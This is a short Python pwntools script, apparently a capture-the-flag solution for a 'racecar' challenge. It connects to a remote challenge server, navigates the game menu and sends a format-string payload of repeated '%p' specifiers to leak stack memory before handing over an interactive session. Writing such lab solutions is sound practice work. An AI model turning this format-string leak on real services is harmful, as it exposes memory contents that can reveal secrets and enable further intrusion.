from pwn import *
import time

time.sleep(2)   # Wait for loading vulnerable file

# r = process('./racecar')
r = remote('167.99.85.216',30131)

# Send username and nickname
name = 'hello'
r.sendline(name)
print(r.recv())

r.sendline(name)
print(r.recv())

"""
    2: Car selection
    1: Choose car
    2: Choose suitable map to win
"""
payload = '2'    
r.sendline(payload)
print(r.recv())

payload = '1'    
r.sendline(payload)
print(r.recv())

payload = '2'    
r.sendline(payload)
print(r.recv())

time.sleep(2)
# Saying after victory
payload = '%p '* 30
r.sendline(payload)
output = r.recv()
print(output)

r.interactive()